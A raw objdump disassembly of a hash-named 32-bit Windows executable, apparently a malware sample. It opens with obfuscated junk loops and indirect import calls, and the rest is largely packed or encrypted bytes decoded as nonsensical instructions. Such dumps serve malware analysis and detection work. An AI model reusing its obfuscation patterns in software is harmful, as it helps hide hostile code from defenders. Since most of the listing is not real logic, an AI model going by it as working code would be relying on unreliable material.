
6a2486918f1d56d14fd51d9046b57d722df80ca452ec22116db6facaab22fbd2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43478b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x434663
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x4346d3
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x434673,0x4346c7
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43478b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x4346bb,0x10
  40104d:	cmp    DWORD PTR ds:0x4346bb,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x4346bb,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x4346bb,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x4346bb
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x4346bb,ebx
  401095:	mov    ebx,DWORD PTR ds:0x4346bb
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x4346bb,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43478f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x4346df
  4010b6:	mov    ebx,DWORD PTR ds:0x4347b3
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434687,0x43470b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43470f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43470f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43470f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43470f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43470f,0xe
  401103:	jne    0x401119
  401109:	push   0x43466b
  40110e:	push   0x4349db
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43470f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43470f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43470f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x43466b,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0x9a491829
  401151:	idiv   DWORD PTR ds:[esi+0x7e]
  401155:	jle    0x4011d5
  401157:	mov    ch,0x7f
  401159:	jle    0x4011d9
  40115b:	into   
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	movups xmm1,XMMWORD PTR [edi+ecx*1]
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x6c4f0cb1
  401207:	mov    ds:0x8434c3b2,al
  40120c:	scas   eax,DWORD PTR es:[edi]
  40120d:	loopne 0x40126e
  40120f:	pop    ecx
  401210:	sbb    DWORD PTR [ecx+0x1cfe271d],esi
  401216:	pushf  
  401217:	aam    0x40
  401219:	or     ebx,ecx
  40121b:	jne    0x401222
  40121d:	jns    0x401262
  40121f:	xchg   edx,eax
  401220:	pop    ebx
  401221:	xchg   ebp,eax
  401222:	cdq    
  401223:	loopne 0x40123e
  401225:	push   cs
  401226:	sahf   
  401227:	push   es
  401228:	xchg   edi,eax
  401229:	fistp  WORD PTR [ebx+0x3a4ce594]
  40122f:	mov    ecx,0x62dcdf29
  401234:	test   BYTE PTR [esi-0x2629c950],ch
  40123a:	lahf   
  40123b:	je     0x401203
  40123d:	mov    bl,0x47
  40123f:	pop    ebp
  401240:	popf   
  401241:	in     al,0x51
  401243:	nop
  401244:	cmc    
  401245:	mov    al,ds:0xcffa7578
  40124a:	aam    0xcd
  40124c:	xchg   ebp,eax
  40124d:	pop    ebp
  40124e:	test   al,0x31
  401250:	je     0x401272
  401252:	test   BYTE PTR [ebx],0x9
  401255:	aam    0x56
  401257:	das    
  401258:	out    dx,eax
  401259:	dec    edi
  40125a:	nop
  40125b:	cld    
  40125c:	aaa    
  40125d:	cmp    BYTE PTR [eax],0xcb
  401260:	retf   
  401261:	sbb    DWORD PTR [ecx+esi*8],ecx
  401264:	jnp    0x40124e
  401266:	std    
  401267:	aad    0x6c
  401269:	pop    ebp
  40126a:	cld    
  40126b:	pop    ecx
  40126c:	test   eax,0xc7e3d108
  401271:	pop    edx
  401272:	je     0x4012c8
  401274:	popf   
  401275:	les    eax,FWORD PTR [ecx+edx*1+0x13c23381]
  40127c:	outs   dx,DWORD PTR ds:[esi]
  40127d:	inc    esi
  40127e:	xlat   BYTE PTR ds:[ebx]
  40127f:	test   al,0xfd
  401281:	add    esp,0xee7ef0ce
  401287:	mov    ebp,0x85ed5956
  40128c:	out    0xcc,al
  40128e:	xor    al,al
  401290:	cld    
  401291:	mov    bh,0x66
  401293:	ror    eax,0x1a
  401296:	mov    cl,0x35
  401298:	and    BYTE PTR [eax-0x22],dl
  40129b:	fimul  DWORD PTR [eax+eax*4+0x45]
  40129f:	(bad)  
  4012a0:	add    bh,dl
  4012a2:	mov    ebx,0xa76ee22f
  4012a7:	jmp    0x9c2c:0x283fa295
  4012ae:	aaa    
  4012af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012b0:	pop    ds
  4012b1:	mov    eax,ds:0x276231c3
  4012b6:	pushf  
  4012b7:	add    eax,0xb167159f
  4012bc:	mov    esp,0x8bd05c38
  4012c1:	retf   
  4012c2:	jmp    0x536:0x1096146b
  4012c9:	adc    BYTE PTR [esi-0x10],dh
  4012cc:	inc    ebp
  4012cd:	retf   
  4012ce:	popa   
  4012cf:	xor    eax,0x531a4338
  4012d4:	mov    ebp,0xae4b67e8
  4012d9:	ins    BYTE PTR es:[edi],dx
  4012da:	adc    eax,0xc190c23c
  4012df:	fadd   DWORD PTR [ebx+0x56]
  4012e2:	dec    esi
  4012e3:	(bad)  
  4012e4:	mov    ah,BYTE PTR [eax-0x715da8e8]
  4012ea:	std    
  4012eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012ec:	sub    dl,BYTE PTR [ecx]
  4012ee:	xor    al,0xf0
  4012f0:	popf   
  4012f1:	adc    al,0xb1
  4012f3:	dec    ebp
  4012f4:	fnstenv [esi-0x3cee3317]
  4012fa:	mov    ds:0xaa23bf5a,eax
  4012ff:	lahf   
  401300:	jns    0x401322
  401302:	inc    ebx
  401303:	pop    edx
  401304:	or     BYTE PTR [eax+0x105557d4],ch
  40130a:	fmulp  st(3),st
  40130c:	adc    DWORD PTR [eax-0x6e],ecx
  40130f:	xchg   esp,eax
  401310:	test   BYTE PTR [ecx+ecx*4+0x1],bl
  401314:	adc    ecx,0x1222
  40131a:	lea    eax,[ebp-0x4]
  40131d:	xor    DWORD PTR ds:0x4346ff,0x53dc
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x4346bf,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x43466f,0x434663
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x434673,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x434743,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x434743
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x434743,ebx
  40137c:	cmp    DWORD PTR ds:0x434743,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x434743,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x434743
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x434743,ebx
  4013ae:	cmp    DWORD PTR ds:0x434743,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x4346bf,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43470b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x43466f,0x4346bf
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x43466b,0x434777
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434683,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [ecx],edx
  401418:	mov    BYTE PTR [edi+0x53],dl
  40141b:	mov    ch,0x7f
  40141d:	jle    0x40149d
  40141f:	mov    ch,0x7f
  401421:	jle    0x4014a1
  401423:	sahf   
  401424:	fwait
  401425:	sub    edx,eax
  401427:	sbb    esp,0xffffffec
  40142a:	mov    al,ds:0xcec6c999
  40142f:	inc    edx
  401430:	mov    bh,0x2
  401432:	into   
  401433:	and    eax,DWORD PTR [ebx]
  401435:	stc    
  401436:	mov    esp,ss
  401438:	xor    DWORD PTR [ebx+0x5b1eb5f],edx
  40143e:	cmp    bl,cl
  401440:	adc    al,0x2d
  401442:	lds    esi,FWORD PTR [eax]
  401444:	repnz adc dl,BYTE PTR [ebp-0x561883d2]
  40144b:	es mov eax,0xf1237bff
  401451:	aad    0xdf
  401453:	jecxz  0x401443
  401455:	dec    BYTE PTR [ecx-0x20]
  401458:	sub    dl,BYTE PTR [ebx-0x56]
  40145b:	fstp   QWORD PTR [edi+0x514c30cc]
  401461:	mov    eax,ds:0x9c40e424
  401466:	jecxz  0x40148b
  401468:	cdq    
  401469:	jmp    0xbd5:0x2d48f9b4
  401470:	test   eax,0x72f82530
  401475:	add    DWORD PTR [esi-0x5e62a64b],edx
  40147b:	add    cl,dh
  40147d:	mov    bl,0xfc
  40147f:	pop    DWORD PTR [ebx]
  401481:	xor    DWORD PTR ds:0x7f26e4a7,esi
  401487:	in     al,0xbc
  401489:	jge    0x401429
  40148b:	inc    ecx
  40148c:	rcl    BYTE PTR [esi+0x71],0xed
  401490:	dec    ebx
  401491:	or     ecx,ecx
  401493:	out    0x13,al
  401495:	ss jmp 0x8a27:0x2b7ad9d2
  40149d:	mov    dl,0xb1
  40149f:	jp     0x401516
  4014a1:	add    DWORD PTR [eax-0x14],0xffffffff
  4014a5:	outs   dx,DWORD PTR ds:[esi]
  4014a6:	add    BYTE PTR [ecx-0x63b0e91],ch
  4014ac:	aad    0xf5
  4014ae:	push   ebp
  4014af:	retf   0x57e4
  4014b2:	add    al,0xdd
  4014b4:	mov    ds:0x3444dd91,al
  4014b9:	stos   BYTE PTR es:[edi],al
  4014ba:	(bad)  
  4014bb:	adc    cl,dl
  4014bd:	sbb    eax,0xa56c66a0
  4014c2:	dec    ebp
  4014c3:	pop    eax
  4014c4:	loope  0x4014f5
  4014c6:	pop    es
  4014c7:	nop
  4014c8:	jo     0x401521
  4014ca:	xchg   edx,eax
  4014cb:	lods   al,BYTE PTR ds:[esi]
  4014cc:	(bad)  
  4014cd:	in     eax,dx
  4014ce:	into   
  4014cf:	jns    0x401476
  4014d1:	loope  0x401541
  4014d3:	adc    al,0x26
  4014d5:	in     eax,dx
  4014d6:	sub    BYTE PTR [esi],ch
  4014d8:	mov    al,0x56
  4014da:	inc    eax
  4014db:	dec    edx
  4014dc:	and    esp,DWORD PTR [eax-0x4b87fdae]
  4014e2:	rcr    BYTE PTR [esi+ebx*2-0x55],cl
  4014e6:	ds or  edx,edx
  4014e9:	jmp    0xc031:0x3b31d636
  4014f0:	xor    edi,ebx
  4014f2:	inc    edx
  4014f3:	pop    ebp
  4014f4:	xor    eax,0xa8f8a3dc
  4014f9:	mov    BYTE PTR [eax+esi*1+0x65fd2451],dl
  401500:	sub    DWORD PTR [edi],0xfec17526
  401506:	mov    eax,0x440a87fc
  40150b:	retf   0xe3d6
  40150e:	scas   al,BYTE PTR es:[edi]
  40150f:	jnp    0x40155a
  401511:	loope  0x4014d9
  401513:	jecxz  0x40157d
  401515:	or     al,0xec
  401517:	mov    BYTE PTR [esi-0x145f1630],dl
  40151d:	(bad)  
  40151e:	(bad)  
  40151f:	repnz mov al,ds:0xa1129424
  401525:	jecxz  0x40155e
  401527:	add    esi,DWORD PTR [edi-0xc]
  40152a:	xchg   ecx,eax
  40152b:	add    al,0x99
  40152d:	nop
  40152e:	inc    edx
  401530:	fnstenv [ebx+0x19]
  401533:	sti    
  401534:	jl     0x4014de
  401536:	stc    
  401537:	dec    DWORD PTR [ebp+0x23]
  40153a:	enter  0xf420,0x61
  40153e:	push   cs
  40153f:	inc    ebx
  401540:	sbb    cl,BYTE PTR [eax-0x4fefc142]
  401546:	sbb    BYTE PTR [ebx+0x6509c04a],bl
  40154c:	add    eax,0x92a0b39b
  401551:	pop    edx
  401552:	(bad)  
  401553:	adc    DWORD PTR [ebp-0x541c5c50],eax
  401559:	(bad)  [edi+0x68d8966e]
  40155f:	or     esp,DWORD PTR [ecx+0x1a661d74]
  401565:	ds into 
  401567:	aas    
  401568:	sbb    al,0x99
  40156a:	mov    al,ch
  40156c:	or     DWORD PTR ds:0x6240d998,edi
  401572:	mov    ebp,0xbf6d867c
  401577:	pop    esi
  401578:	ret    
  401579:	push   edx
  40157a:	les    edi,FWORD PTR [edx+ebp*1]
  40157d:	retf   
  40157e:	push   ecx
  40157f:	mov    bh,0x50
  401581:	jnp    0x4015cd
  401583:	xchg   ebx,eax
  401584:	jns    0x4015d6
  401586:	in     eax,0xdd
  401588:	imul   eax,DWORD PTR ds:0x74d6badd,0xe573da9f
  401592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401593:	pop    ebx
  401594:	mov    edx,0xad9001b9
  401599:	ror    DWORD PTR [edx+0x7004b226],1
  40159f:	mov    eax,0x2745bf36
  4015a4:	hlt    
  4015a5:	gs jb  0x4015b3
  4015a8:	jnp    0x4015d7
  4015aa:	lods   al,BYTE PTR ds:[esi]
  4015ab:	mov    ah,0xd5
  4015ad:	pop    eax
  4015ae:	in     al,dx
  4015af:	and    eax,0xe4baa410
  4015b4:	xor    eax,0x24634147
  4015b9:	popf   
  4015ba:	and    eax,0xb6b423af
  4015bf:	adc    BYTE PTR [ecx+0x7d],ah
  4015c2:	push   ss
  4015c3:	pop    ebp
  4015c4:	dec    esi
  4015c5:	(bad)  
  4015c6:	rol    ah,cl
  4015c8:	call   0xd4d8:0xbb40022e
  4015cf:	jnp    0x401631
  4015d1:	or     al,0xf7
  4015d3:	push   esi
  4015d4:	mov    al,0xee
  4015d6:	xor    DWORD PTR [eax+0x458bd857],ecx
  4015dc:	or     BYTE PTR [ebx+0x43478f0d],cl
  4015e2:	add    BYTE PTR [ecx],ah
  4015e4:	or     eax,0x43473f
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x434663,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x4346c3,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434713,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434703,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434703
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434703,ecx
  40162d:	cmp    DWORD PTR ds:0x434703,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434703,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434703
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434703,ecx
  40165f:	cmp    DWORD PTR ds:0x434703,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x4346a3
  401674:	mov    eax,ds:0x4346eb
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x43474b,0x434777
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x43466b,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x43466f,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	mov    eax,0xecbdf5e6
  4016be:	jns    0x40173e
  4016c0:	jle    0x401677
  4016c2:	jg     0x401742
  4016c4:	jle    0x401709
  4016c6:	pop    ds
  4016c7:	addr16 jle 0x40164b
  4016ca:	and    al,0xa2
  4016cc:	and    DWORD PTR [edi-0x197d5b25],ebx
  4016d2:	jae    0x4016fb
  4016d4:	iret   
  4016d5:	and    DWORD PTR [edi+edi*4-0x1d0fe233],edi
  4016dc:	outs   dx,BYTE PTR ds:[esi]
  4016dd:	adc    ebx,DWORD PTR [edi]
  4016df:	retf   0x83c9
  4016e2:	fsubr  DWORD PTR [edx+0x1d]
  4016e5:	outs   dx,DWORD PTR ds:[esi]
  4016e6:	mul    ah
  4016e8:	nop
  4016e9:	xor    esp,edi
  4016eb:	xchg   edi,eax
  4016ec:	repz neg ch
  4016ef:	xchg   esp,eax
  4016f0:	jb     0x40173b
  4016f2:	adc    DWORD PTR [ecx+0x7fb758cf],0xd22fb2ba
  4016fc:	imul   esp,DWORD PTR [esi+0x4e1b1064],0xe13385ba
  401706:	fwait
  401707:	add    DWORD PTR [ecx-0x28406c75],0x40800585
  401711:	xor    ebp,DWORD PTR [edi]
  401713:	jns    0x40178e
  401715:	int    0xe6
  401717:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  401719:	mov    ch,0x86
  40171b:	and    BYTE PTR [ebp-0x2f],dl
  40171e:	and    ebx,ebp
  401720:	iret   
  401721:	adc    BYTE PTR [edi+edi*2-0x6dd534fb],dl
  401728:	cmp    al,BYTE PTR [ebx-0x5f8c290e]
  40172e:	xchg   ebx,ebp
  401730:	or     al,0x3a
  401732:	dec    ecx
  401733:	lahf   
  401734:	and    BYTE PTR [eax],bl
  401736:	mov    edx,0x964f0b1f
  40173b:	inc    edx
  40173c:	pusha  
  40173d:	js     0x401737
  40173f:	sbb    ecx,DWORD PTR [ebx+0x269ff340]
  401745:	push   ecx
  401746:	pop    ebx
  401747:	loopne 0x4016e5
  401749:	rcr    DWORD PTR [ebx-0x5a4e52c1],0x34
  401750:	dec    eax
  401751:	mov    ah,0x1c
  401753:	xchg   ecx,eax
  401754:	imul   edi,DWORD PTR ds:0xad0b66d7,0x4cdec443
  40175e:	mov    gs,WORD PTR ds:0x6966d5d
  401764:	lock repnz sbb ah,BYTE PTR [edx]
  401768:	cmp    al,BYTE PTR [edx]
  40176a:	mov    BYTE PTR [edi+0x48],dh
  40176d:	out    dx,al
  40176e:	adc    bl,ch
  401770:	test   al,0x4c
  401772:	retf   0xdd14
  401775:	mov    ebx,0x3f1f334d
  40177a:	cmp    eax,0x7ab14293
  40177f:	les    ecx,FWORD PTR [edi-0x19]
  401782:	dec    edx
  401783:	jecxz  0x401764
  401785:	fsqrt  
  401787:	imul   esp,DWORD PTR [eax-0xe612074],0xffffffdc
  40178e:	sbb    eax,0x5fec05d2
  401793:	rol    ebp,cl
  401795:	ds mov al,0x92
  401798:	outs   dx,DWORD PTR ds:[esi]
  401799:	loop   0x40179b
  40179b:	mov    bh,ch
  40179d:	mov    eax,ds:0x999eb5ca
  4017a2:	imul   esi,DWORD PTR [ecx+eiz*1],0xfc10724a
  4017a9:	lea    ebp,[eax-0x6e]
  4017ac:	repz test BYTE PTR [ecx],0xc1
  4017b0:	mov    ch,0xce
  4017b2:	(bad)  
  4017b3:	call   0xb98659b0
  4017b8:	gs pop ebp
  4017ba:	pop    edx
  4017bb:	sub    DWORD PTR [edi],ebx
  4017bd:	imul   edi,DWORD PTR [ecx-0x19e82662],0x2f
  4017c4:	jge    0x401816
  4017c6:	xor    BYTE PTR [eax+0x46],0x89
  4017ca:	xchg   edi,eax
  4017cb:	add    al,0x3d
  4017cd:	adc    bh,BYTE PTR [esi+0x78]
  4017d0:	xor    ecx,DWORD PTR [esi+0x5]
  4017d3:	ins    BYTE PTR es:[edi],dx
  4017d4:	shl    DWORD PTR [ebx-0x1bfdd9a3],cl
  4017da:	push   edi
  4017db:	rcr    DWORD PTR [ecx-0x5f],1
  4017de:	xchg   edx,eax
  4017df:	mov    ah,0x65
  4017e1:	push   eax
  4017e2:	fwait
  4017e3:	loop   0x401785
  4017e5:	push   cs
  4017e6:	sub    eax,DWORD PTR [edi+ecx*8+0x36d1a573]
  4017ed:	and    DWORD PTR [esi+0x4b3af91a],ebp
  4017f3:	pop    ebp
  4017f4:	icebp  
  4017f5:	mov    ch,0x4d
  4017f7:	sub    al,0x56
  4017f9:	pop    ss
  4017fa:	loope  0x4017e6
  4017fc:	sbb    al,0x4e
  4017fe:	adc    DWORD PTR [eax-0x56eef577],ecx
  401804:	xchg   edx,eax
  401805:	rol    DWORD PTR [edi],cl
  401807:	jns    0x4017f2
  401809:	xor    eax,0xd5155e2f
  40180e:	mov    ds:0xa055e819,al
  401813:	and    al,0x7f
  401815:	pop    eax
  401816:	dec    ecx
  401817:	dec    esi
  401818:	das    
  401819:	sar    BYTE PTR [ebp+0x5240c5b1],1
  40181f:	fistp  DWORD PTR [edx]
  401821:	jbe    0x40185e
  401823:	or     DWORD PTR ds:0x452cde6c,eax
  401829:	mov    ?,ebx
  40182b:	jmp    0x401897
  40182d:	(bad)  
  40182e:	or     esp,DWORD PTR [edx]
  401830:	fistp  WORD PTR [ecx]
  401832:	sub    al,0xbc
  401834:	arpl   WORD PTR [esi],cx
  401836:	int    0xab
  401838:	fbstp  TBYTE PTR [edi-0xb7b80cc]
  40183e:	push   ecx
  40183f:	out    0xeb,al
  401841:	shl    edx,0xc3
  401844:	push   esp
  401845:	mov    cl,0x6e
  401847:	push   ecx
  401848:	xchg   ecx,eax
  401849:	addr16 xor edi,edx
  40184c:	hlt    
  40184d:	pushf  
  40184e:	fstp   QWORD PTR [ebp-0x7b]
  401851:	jge    0x4017e0
  401853:	mov    cl,0xb5
  401855:	dec    eax
  401856:	std    
  401857:	gs push cs
  401859:	pmuludq mm7,QWORD PTR [edi+eax*8]
  40185d:	mov    edx,0xffbc0d92
  401862:	rcr    BYTE PTR [ebp-0x2e7823c3],0x28
  401869:	and    BYTE PTR ds:0xef7ab0e2,ch
  40186f:	inc    esi
  401870:	jle    0x4017f8
  401872:	mov    WORD PTR [ecx+0x4fc2bcbb],ss
  401878:	test   eax,0xf0a334c
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4347830d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x434663
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    BYTE PTR [ecx+0x1bc30eae],ah
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x40183a
  4018ac:	cmp    eax,0x994d9296
  4018b1:	cwde   
  4018b2:	into   
  4018b3:	jnp    0x401898
  4018b5:	sti    
  4018b6:	psubsw mm1,QWORD PTR [eax+0x1db56a2a]
  4018bd:	sub    ah,BYTE PTR [edx-0x5]
  4018c0:	dec    esp
  4018c1:	or     bh,BYTE PTR [ecx-0x739e0fa5]
  4018c7:	cmp    ecx,DWORD PTR [edi-0x61]
  4018ca:	or     DWORD PTR [edi],edi
  4018cc:	jmp    0x91260e5d
  4018d1:	sbb    dl,dh
  4018d3:	dec    esp
  4018d4:	push   es
  4018d5:	ja     0x4018c0
  4018d7:	pusha  
  4018d8:	fs cmp cl,cl
  4018db:	xor    dl,BYTE PTR [ebx-0x4749dfdc]
  4018e1:	inc    eax
  4018e2:	aad    0x38
  4018e4:	icebp  
  4018e5:	ret    
  4018e6:	std    
  4018e7:	lods   al,BYTE PTR ds:[esi]
  4018e8:	jmp    FWORD PTR [ebp+0x6ac216f]
  4018ee:	push   0xffffffe3
  4018f0:	fild   DWORD PTR [edx+0x13]
  4018f3:	cmc    
  4018f4:	(bad)  
  4018f5:	cmp    DWORD PTR [eax+0x6f],edi
  4018f8:	fwait
  4018f9:	scas   al,BYTE PTR es:[edi]
  4018fa:	mov    ebx,0x35af4f37
  4018ff:	ja     0x4018df
  401901:	imul   edx,DWORD PTR [eax-0x5],0x3ab4e09f
  401908:	rcl    DWORD PTR [esi+ebp*1+0x10],cl
  40190c:	dec    esp
  40190d:	mov    edi,edi
  40190f:	daa    
  401910:	cmp    BYTE PTR gs:[ebp+edx*4-0x41],ch
  401915:	pop    edi
  401916:	mov    ch,BYTE PTR [ebp+0x5d596620]
  40191c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40191d:	xor    eax,ebp
  40191f:	outs   dx,DWORD PTR ds:[esi]
  401920:	add    dl,BYTE PTR [ecx-0x7e]
  401923:	cld    
  401924:	call   0x4c5a:0x7b8de965
  40192b:	inc    esi
  40192c:	cs inc esi
  40192e:	fisttp QWORD PTR [ebp-0x2ce2cbe0]
  401934:	mov    ah,0x1d
  401936:	(bad)  
  401937:	jmp    0xdf90:0x55c6bdfc
  40193e:	cmp    DWORD PTR [ecx],ebx
  401940:	out    dx,al
  401941:	call   0x25a70be1
  401946:	sbb    eax,0x7b447353
  40194b:	mov    eax,0xd744a53a
  401950:	in     eax,0xfd
  401952:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
